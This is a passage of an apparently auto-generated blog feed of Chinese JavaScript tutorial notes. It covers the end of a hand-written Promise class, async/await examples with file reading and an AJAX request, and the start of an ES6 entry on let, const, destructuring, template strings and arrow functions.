class="line">                    <span class="comment">//修改返回对象的状态为 『失败』</span></span><br><span class="line">                    <span class="title function_">reject</span>(r);</span><br><span class="line">                &#125;)</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Promise-封装 | 17 - class版本封装<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;./promise.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">let</span> p1 = <span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="comment">// throw &#x27;error&#x27; // 异步任务中不能抛错，捕获不到，内置promise也一样</span></span></span><br><span class="line"><span class="language-javascript">            <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;</span></span><br><span class="line"><span class="language-javascript">                <span class="comment">// resolve(&quot;OK&quot;);</span></span></span><br><span class="line"><span class="language-javascript">                <span class="title function_">reject</span>(<span class="string">&quot;Error&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">            &#125;)</span></span><br><span class="line"><span class="language-javascript">        &#125;);</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">        p1.<span class="title function_">then</span>(<span class="function"><span class="params">value</span> =&gt;</span> &#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="variable language_">console</span>.<span class="title function_">log</span>(value);</span></span><br><span class="line"><span class="language-javascript">        &#125;, <span class="function"><span class="params">reason</span> =&gt;</span> &#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="variable language_">console</span>.<span class="title function_">warn</span>(reason);</span></span><br><span class="line"><span class="language-javascript">        &#125;);</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">Promise</span>.<span class="title function_">resolve</span>(<span class="string">&#x27;OK&#x27;</span>));</span></span><br><span class="line"><span class="language-javascript">    </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><hr><h1 id="async-与-await"><a href="#async-与-await" class="headerlink" title="async 与 await"></a>async 与 await</h1><h2 id="文档"><a href="#文档" class="headerlink" title="文档"></a>文档</h2><p><a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Statements/async_function">https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Statements/async_function</a><br><a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Operators/await">https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Operators/await</a></p><h2 id="async-函数"><a href="#async-函数" class="headerlink" title="async 函数"></a>async 函数</h2><ul><li><ol><li>函数的返回值为 <code>promise 对象</code></li></ol></li><li><ol start="2"><li><code>promise 对象</code>的<code>结果</code>由 async 函数执行的<code>返回值</code>决定</li></ol></li></ul><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 跟then方法返回结果一样</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">main</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="comment">//1. 如果返回值是一个非Promise类型的数据</span></span><br><span class="line">    <span class="comment">// return 521;</span></span><br><span class="line">    <span class="comment">//2. 如果返回的是一个Promise对象</span></span><br><span class="line">    <span class="comment">// return new Promise((resolve, reject) =&gt; &#123;</span></span><br><span class="line">    <span class="comment">//     // resolve(&#x27;OK&#x27;);</span></span><br><span class="line">    <span class="comment">//     reject(&#x27;Error&#x27;);</span></span><br><span class="line">    <span class="comment">// &#125;);</span></span><br><span class="line">    <span class="comment">//3. 抛出异常</span></span><br><span class="line">    <span class="keyword">throw</span> <span class="string">&quot;Oh NO&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> result = <span class="title function_">main</span>();</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(result);</span><br></pre></td></tr></table></figure><h2 id="await-表达式"><a href="#await-表达式" class="headerlink" title="await 表达式"></a>await 表达式</h2><ul><li><ol><li>await 右侧的表达式一般为 <code>promise 对象</code>, 但也可以是<code>其它的值</code></li></ol></li><li><ol start="2"><li>如果表达式是 <code>promise 对象</code>, await 返回的是 <code>promise 成功的值</code></li></ol></li><li><ol start="3"><li>如果表达式是<code>其它值</code>, 直接将此值作为 await 的返回值</li></ol></li></ul><h2 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h2><ul><li><ol><li><code>await</code> 必须写在 <code>async 函数</code>中, 但 <code>async 函数</code>中可以<code>没有 await</code></li></ol></li><li><ol start="2"><li>如果 <code>await</code> 的 <code>promise 失败</code>了, 就会<code>抛出异常</code>, 需要通过 <code>try...catch</code> 捕获处理</li></ol></li></ul><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">main</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">let</span> p = <span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class="line">        <span class="comment">// resolve(&#x27;OK&#x27;);</span></span><br><span class="line">        <span class="title function_">reject</span>(<span class="string">&#x27;Error&#x27;</span>);</span><br><span class="line">    &#125;)</span><br><span class="line">    <span class="comment">//1. 右侧为promise的情况</span></span><br><span class="line">    <span class="comment">// let res = await p;</span></span><br><span class="line">    <span class="comment">//2. 右侧为其他类型的数据</span></span><br><span class="line">    <span class="comment">// let res2 = await 20;</span></span><br><span class="line">    <span class="comment">//3. 如果promise是失败的状态</span></span><br><span class="line">    <span class="keyword">try</span>&#123;</span><br><span class="line">        <span class="keyword">let</span> res3 = <span class="keyword">await</span> p;</span><br><span class="line">    &#125;<span class="keyword">catch</span>(e)&#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(e); <span class="comment">// Error</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_">main</span>();</span><br></pre></td></tr></table></figure><h2 id="async与await结合"><a href="#async与await结合" class="headerlink" title="async与await结合"></a>async与await结合</h2><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 读取resource文件夹下 1.html  2.html 3.html 文件内容</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">&#x27;fs&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> util = <span class="built_in">require</span>(<span class="string">&#x27;util&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> mineReadFile = util.<span class="title function_">promisify</span>(fs.<span class="property">readFile</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//回调函数的方式</span></span><br><span class="line"><span class="comment">// fs.readFile(&#x27;./resource/1.html&#x27;, (err, data1) =&gt; &#123;</span></span><br><span class="line"><span class="comment">//     if(err) throw err;</span></span><br><span class="line"><span class="comment">//     fs.readFile(&#x27;./resource/2.html&#x27;, (err, data2) =&gt; &#123;</span></span><br><span class="line"><span class="comment">//         if(err) throw err;</span></span><br><span class="line"><span class="comment">//         fs.readFile(&#x27;./resource/3.html&#x27;, (err, data3) =&gt; &#123;</span></span><br><span class="line"><span class="comment">//             if(err) throw err;</span></span><br><span class="line"><span class="comment">//             console.log(data1 + data2 + data3);</span></span><br><span class="line"><span class="comment">//         &#125;);</span></span><br><span class="line"><span class="comment">//     &#125;);</span></span><br><span class="line"><span class="comment">// &#125;);</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//async 与 await</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">main</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">try</span>&#123;</span><br><span class="line">        <span class="comment">//读取第一个文件的内容</span></span><br><span class="line">        <span class="keyword">let</span> data1 = <span class="keyword">await</span> <span class="title function_">mineReadFile</span>(<span class="string">&#x27;./resource/1x.html&#x27;</span>);</span><br><span class="line">        <span class="keyword">let</span> data2 = <span class="keyword">await</span> <span class="title function_">mineReadFile</span>(<span class="string">&#x27;./resource/2.html&#x27;</span>);</span><br><span class="line">        <span class="keyword">let</span> data3 = <span class="keyword">await</span> <span class="title function_">mineReadFile</span>(<span class="string">&#x27;./resource/3.html&#x27;</span>);</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(data1 + data2 + data3);</span><br><span class="line">    &#125;<span class="keyword">catch</span>(e)&#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(e);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_">main</span>();</span><br></pre></td></tr></table></figure><h2 id="async与await结合发送AJAX"><a href="#async与await结合发送AJAX" class="headerlink" title="async与await结合发送AJAX"></a>async与await结合发送AJAX</h2><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">//axios</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">sendAJAX</span>(<span class="params">url</span>)&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">const</span> xhr = <span class="keyword">new</span> <span class="title class_">XMLHttpRequest</span>();</span><br><span class="line">        xhr.<span class="property">responseType</span> = <span class="string">&#x27;json&#x27;</span>;</span><br><span class="line">        xhr.<span class="title function_">open</span>(<span class="string">&quot;GET&quot;</span>, url);</span><br><span class="line">        xhr.<span class="title function_">send</span>();</span><br><span class="line">        <span class="comment">//处理结果</span></span><br><span class="line">        xhr.<span class="property">onreadystatechange</span> = <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">            <span class="keyword">if</span>(xhr.<span class="property">readyState</span> === <span class="number">4</span>)&#123;</span><br><span class="line">                <span class="comment">//判断成功</span></span><br><span class="line">                <span class="keyword">if</span>(xhr.<span class="property">status</span> &gt;= <span class="number">200</span> &amp;&amp; xhr.<span class="property">status</span> &lt; <span class="number">300</span>)&#123;</span><br><span class="line">                    <span class="comment">//成功的结果</span></span><br><span class="line">                    <span class="title function_">resolve</span>(xhr.<span class="property">response</span>);</span><br><span class="line">                &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                    <span class="title function_">reject</span>(xhr.<span class="property">status</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//段子接口地址 https://api.apiopen.top/getJoke</span></span><br><span class="line"><span class="keyword">let</span> btn = <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;#btn&#x27;</span>);</span><br><span class="line"></span><br><span class="line">btn.<span class="title function_">addEventListener</span>(<span class="string">&#x27;click&#x27;</span>,<span class="keyword">async</span> <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="comment">//获取段子信息</span></span><br><span class="line">    <span class="keyword">let</span> duanzi = <span class="keyword">await</span> <span class="title function_">sendAJAX</span>(<span class="string">&#x27;https://api.apiopen.top/getJoke&#x27;</span>);</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(duanzi);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Promise </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Promise </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ES6-ES11</title>
      <link href="/2022/06/14/ES6/"/>
      <url>/2022/06/14/ES6/</url>
      
        <content type="html"><![CDATA[<h1 id="ES简介"><a href="#ES简介" class="headerlink" title="ES简介"></a>ES简介</h1><p><strong>ES全称EcmaScript，是脚本语言的规范，而平时编写的JavaScript是EcmaScript的一种实现，所以ES新特性其实质就是JavaScript的新特性</strong></p><hr><h1 id="ES6"><a href="#ES6" class="headerlink" title="ES6"></a>ES6</h1><h2 id="let关键字"><a href="#let关键字" class="headerlink" title="let关键字"></a>let关键字</h2><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">//声明变量</span></span><br><span class="line"><span class="keyword">let</span> a;</span><br><span class="line"><span class="keyword">let</span> b, c, d;</span><br><span class="line"><span class="keyword">let</span> e = <span class="number">100</span>;</span><br><span class="line"><span class="keyword">let</span> f = <span class="number">521</span>, g = <span class="string">&#x27;iloveyou&#x27;</span>, h = [];</span><br></pre></td></tr></table></figure><h3 id="let-关键字用来声明变量"><a href="#let-关键字用来声明变量" class="headerlink" title="let 关键字用来声明变量"></a>let 关键字用来声明变量</h3><ul><li>不允许重复声明</li></ul><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> star = <span class="string">&#x27;罗志祥&#x27;</span>; <span class="comment">// 重复声明变量，变量被污染</span></span><br><span class="line"><span class="keyword">let</span> star = <span class="string">&#x27;小猪&#x27;</span>; <span class="comment">// 重复声明会报错，var可以重复声明</span></span><br></pre></td></tr></table></figure><ul><li>块儿级作用域 全局, 函数, eval(es5的严格模式)</li></ul><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// if else while for </span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">let</span> girl = <span class="string">&#x27;周扬青&#x27;</span>;</span><br><span class="line">    <span class="keyword">var</span> boy = <span class="string">&#x27;周扬&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(girl); <span class="comment">// 报错</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(boy); <span class="comment">// 周扬</span></span><br></pre></td></tr></table></figure><ul><li>不存在变量提升</li></ul><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(song); <span class="comment">// undefined</span></span><br><span class="line"><span class="keyword">var</span> song = <span class="string">&#x27;恋爱达人&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(song); <span class="comment">// 报错</span></span><br><span class="line"><span class="keyword">let</span> song = <span class="string">&#x27;恋爱达人&#x27;</span>;</span><br></pre></td></tr></table></figure><ul><li>不影响作用域链</li></ul><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="keyword">let</span> school = <span class="string">&#x27;尚硅谷&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">fn</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(school); <span class="comment">// 尚硅谷</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="title function_">fn</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="实践案例"><a href="#实践案例" class="headerlink" title="实践案例"></a>实践案例</h3><ul><li>三个div点击其中的一个使其颜色变成粉色</li></ul><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">//获取div元素对象</span></span><br><span class="line"><span class="keyword">let</span> items = <span class="variable language_">document</span>.<span class="title function_">getElementsByClassName</span>(<span class="string">&#x27;item&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//遍历并绑定事件</span></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; items.<span class="property">length</span>; i++) &#123;</span><br><span class="line">    items[i].<span class="property">onclick</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">        <span class="comment">//修改当前元素的背景颜色</span></span><br><span class="line">        <span class="comment">// this.style.background = &#x27;pink&#x27;;</span></span><br><span class="line">        items[i].<span class="property">style</span>.<span class="property">background</span> = <span class="string">&#x27;pink&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//遍历并绑定事件</span></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; items.<span class="property">length</span>; i++) &#123;</span><br><span class="line">    items[i].<span class="property">onclick</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">        <span class="comment">//修改当前元素的背景颜色</span></span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">style</span>.<span class="property">background</span> = <span class="string">&#x27;pink&#x27;</span>;</span><br><span class="line">        <span class="comment">//items[i].style.background = &#x27;pink&#x27;; // items[3] 报错</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 循环体执行完i的值</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">window</span>.<span class="property">i</span>) <span class="comment">// 3 </span></span><br></pre></td></tr></table></figure><hr><h2 id="const"><a href="#const" class="headerlink" title="const"></a>const</h2><h3 id="const声明常量"><a href="#const声明常量" class="headerlink" title="const声明常量"></a>const声明常量</h3><ul><li>声明必须赋予初始值</li></ul><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> A; <span class="comment">// 报错</span></span><br></pre></td></tr></table></figure><ul><li>标识符一般为大写</li></ul><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> a = <span class="number">100</span>; <span class="comment">// 不报错(潜规则)</span></span><br></pre></td></tr></table></figure><ul><li>值不允许修改</li></ul><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="variable constant_">SCHOOL</span> = <span class="string">&#x27;尚硅谷&#x27;</span>;</span><br><span class="line"><span class="variable constant_">SCHOOL</span> = <span class="string">&#x27;ATGUIGU&#x27;</span>; <span class="comment">// 报错</span></span><br></pre></td></tr></table></figure><ul><li>块儿级作用域</li></ul><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="keyword">const</span> <span class="variable constant_">PLAYER</span> = <span class="string">&#x27;UZI&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable constant_">PLAYER</span>); <span class="comment">// 报错</span></span><br></pre></td></tr></table></figure><ul><li>不允许重复声明</li></ul><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"> <span class="keyword">const</span> <span class="variable constant_">SCHOOL</span> = <span class="string">&#x27;尚硅谷&#x27;</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="variable constant_">SCHOOL</span> = <span class="string">&#x27;ATGUIGU&#x27;</span>; <span class="comment">// 报错</span></span><br></pre></td></tr></table></figure><p><code>注意: 对象属性修改和数组元素变化不会出发 const 错误</code></p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="variable constant_">TEAM</span> = [<span class="string">&#x27;UZI&#x27;</span>, <span class="string">&#x27;MXLG&#x27;</span>, <span class="string">&#x27;Ming&#x27;</span>, <span class="string">&#x27;Letme&#x27;</span>];</span><br><span class="line"><span class="variable constant_">TEAM</span>.<span class="title function_">push</span>(<span class="string">&#x27;Meiko&#x27;</span>); <span class="comment">// 常量所指向的地址没变，所以不报错</span></span><br><span class="line"><span class="variable constant_">TEAM</span> = <span class="number">100</span>; <span class="comment">// 报错</span></span><br></pre></td></tr></table></figure><p><code>应用场景：声明对象类型使用 const，非对象类型声明选择 let</code></p><hr><h2 id="变量的解构赋值"><a href="#变量的解构赋值" class="headerlink" title="变量的解构赋值"></a>变量的解构赋值</h2><p><strong>解构赋值：</strong> ES6 允许按照一定模式从数组和对象中提取值，对变量进行赋值</p><h3 id="数组的解构"><a href="#数组的解构" class="headerlink" title="数组的解构"></a>数组的解构</h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="variable constant_">F4</span> = [<span class="string">&#x27;小沈阳&#x27;</span>, <span class="string">&#x27;刘能&#x27;</span>, <span class="string">&#x27;赵四&#x27;</span>, <span class="string">&#x27;宋小宝&#x27;</span>];</span><br><span class="line"><span class="keyword">let</span> [xiao, liu, zhao, song] = <span class="variable constant_">F4</span>;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(xiao); <span class="comment">// 小沈阳</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(song); <span class="comment">// 宋小宝</span></span><br></pre></td></tr></table></figure><h3 id="对象的解构"><a href="#对象的解构" class="headerlink" title="对象的解构"></a>对象的解构</h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> zhao = &#123;</span><br><span class="line">    <span class="attr">name</span>: <span class="string">&#x27;赵本山&#x27;</span>,</span><br><span class="line">    <span class="attr">age</span>: <span class="string">&#x27;不详&#x27;</span>,</span><br><span class="line">    <span class="attr">xiaopin</span>: <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;我可以演小品&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">let</span> &#123; name, age, xiaopin &#125; = zhao;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(name); <span class="comment">// 赵本山</span></span><br><span class="line"><span class="title function_">xiaopin</span>(); <span class="comment">// 我可以演小品</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><code>注意：频繁使用对象方法、数组元素，就可以使用解构赋值形式</code></p><hr><h2 id="模板字符串"><a href="#模板字符串" class="headerlink" title="模板字符串"></a>模板字符串</h2><p><strong>模板字符串（template string）：</strong> 是增强版的字符串，用反引号（`）标识<br><strong>ES6 引入新的声明字符串的方式 ```` ‘’ “”</strong></p><h3 id="字符串中可以出现换行符"><a href="#字符串中可以出现换行符" class="headerlink" title="字符串中可以出现换行符"></a>字符串中可以出现换行符</h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> str = <span class="string">`&lt;ul&gt;</span></span><br><span class="line"><span class="string">            &lt;li&gt;沈腾&lt;/li&gt;</span></span><br><span class="line"><span class="string">            &lt;li&gt;玛丽&lt;/li&gt;</span></span><br><span class="line"><span class="string">            &lt;li&gt;魏翔&lt;/li&gt;</span></span><br><span class="line"><span class="string">            &lt;li&gt;艾伦&lt;/li&gt;</span></span><br><span class="line"><span class="string">           &lt;/ul&gt;`</span>;</span><br><span class="line"><span class="comment">// 引号加号</span></span><br><span class="line"><span class="keyword">let</span> str = <span class="string">&#x27;&lt;ul&gt;&#x27;</span> +</span><br><span class="line">    <span class="string">&#x27;&lt;li&gt;&#x27;</span> + 沈腾 + <span class="string">&#x27;&lt;/li&gt;&#x27;</span> +</span><br><span class="line">    <span class="string">&#x27;&lt;li&gt;&#x27;</span> + 玛丽 + <span class="string">&#x27;&lt;/li&gt;&#x27;</span> +</span><br><span class="line">    <span class="string">&#x27;&lt;/ul&gt;&#x27;</span></span><br></pre></td></tr></table></figure><h3 id="可以使用-xxx-形式输出变量"><a href="#可以使用-xxx-形式输出变量" class="headerlink" title="可以使用 ${xxx} 形式输出变量"></a>可以使用 ${xxx} 形式输出变量</h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> lovest = <span class="string">&#x27;魏翔&#x27;</span>;</span><br><span class="line"><span class="comment">// let out = lovest + &#x27;是我心目中最搞笑的演员!!&#x27;;</span></span><br><span class="line"><span class="keyword">let</span> out = <span class="string">`<span class="subst">$&#123;lovest&#125;</span>是我心目中最搞笑的演员!!`</span>;</span><br></pre></td></tr></table></figure><p><code>注意：当遇到字符串与变量拼接的情况使用模板字符串</code></p><hr><h2 id="简化对象写法"><a href="#简化对象写法" class="headerlink" title="简化对象写法"></a>简化对象写法</h2><p><strong>ES6 允许在大括号里面，直接写入变量和函数，作为对象的属性和方法</strong></p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> name = <span class="string">&#x27;尚硅谷&#x27;</span>;</span><br><span class="line"><span class="keyword">let</span> change = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;我们可以改变你!!&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> school = &#123;</span><br><span class="line">    name,</span><br><span class="line">    change,</span><br><span class="line">    <span class="title function_">improve</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;我们可以提高你的技能&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(school);</span><br></pre></td></tr></table></figure><hr><h2 id="箭头函数"><a href="#箭头函数" class="headerlink" title="箭头函数"></a>箭头函数</h2><h3 id="「箭头」（-gt-）定义函数"><a href="#「箭头」（-gt-）定义函数" class="headerlink" title="「箭头」（=&gt;）定义函数"></a>「箭头」（=&gt;）定义函数</h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 声明函数</span></span><br><span class="line"><span class="keyword">let</span> fn = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">let</span> <span class="title function_">fn</span> = (<span class="params">a, b</span>) =&gt; &#123;</span><br><span class="line">    <span class="keyword">return</span> a + b;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//调用函数</span></span><br><span class="line"><span class="keyword">let</span> result = <span class="title function_">fn</span>(<span class="number">1</span>, <span class="number">2</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(result);</span><br></pre></td></tr></table></figure><ul><li>箭头函数 this 指向函数声明时所在作用域下 this 的值，this是静态的</li></ul><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">getName</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">this</span>.<span class="property">name</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> <span class="title function_">getName2</span> = (<span class="params"></span>) =&gt; &#123;</span><br><span class="line">    <span class="comment">// 函数声明时所在作用域下 this 的值</span></span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">this</span>.<span class="property">name</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//设置 window 对象的 name 属性</span></span><br><span class="line"><span class="variable language_">window</span>.<span class="property">name</span> = <span class="string">&#x27;尚硅谷&#x27;</span>;</span><br><span class="line"><span class="keyword">const</span> school = &#123;</span><br><span class="line">    <span class="attr">name</span>: <span class="string">&quot;ATGUIGU&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//直接调用</span></span><br><span class="line"><span class="title function_">getName</span>(); <span class="comment">// 尚硅谷</span></span><br><span class="line"><span class="title function_">getName2</span>(); <span class="comment">// 尚硅谷</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//call 方法调用，改变函数内部this值</span></span><br><span class="line">getName.<span class="title function_">call</span>(school); <span class="comment">// ATGUIGU</span></span><br><span class="line">getName2.<span class="title function_">call</span>(school); <span class="comment">// 尚硅谷</span></span><br></pre></td></tr></table></figure><ul><li>箭头函数不能作为构造函数实例化</li></ul><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> <span class="title function_">Person</span> = (<span class="params">name, age</span>) =&gt; &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">name</span> = name;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">age</span> = age;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">let</span> me = <span class="keyword">new</span> <span class="title class_">Person</span>(<span class="string">&#x27;xiao&#x27;</span>, <span class="number">30</span>); <span class="comment">// 报错</span></span><br></pre></td></tr></table></figure><ul><li>不能使用 arguments（保存实参） 变量</li></ul><figure class="highlight js"><table><tr><td class="code"><pre><span 